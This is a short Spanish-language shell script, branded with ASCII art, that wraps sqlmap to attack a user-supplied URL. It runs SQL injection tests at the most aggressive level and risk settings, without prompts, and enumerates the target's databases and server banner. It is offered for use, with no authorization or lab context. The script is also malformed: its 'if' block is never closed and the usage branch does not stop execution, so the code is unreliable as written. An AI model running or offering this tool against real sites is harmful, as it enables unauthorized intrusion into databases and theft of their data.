#!/bin/sh
cat << "INFO"

███████╗ ██████╗ ██╗      ██╗
██╔════╝██╔═══██╗██║      
███████╗██║   ██║██║      ██║
╚════██║██║   ██║██║      ██║
███████║╚██████╔╝███████╗ ██║
╚══════╝ ╚═════╝ ╚══════╝ ╚═╝ (r) 2025 http://www.hackingyseguridad.com/
INFO
if [ -z "$1" ]; then
echo
# --dbs  identifica bases de datos disponibles: "
# --level=5 --risk=3 probar todos los parametros:"
# --banner información del banner:"
echo 
echo "Uso.: ./sqli.sh <URL>"
echo "<URL> p. ej.: http://hackingyseguridad.com/?s=variable"
echo 

sqlmap -u $1 $2 --level=5 --risk=3 --batch --dbs --banner
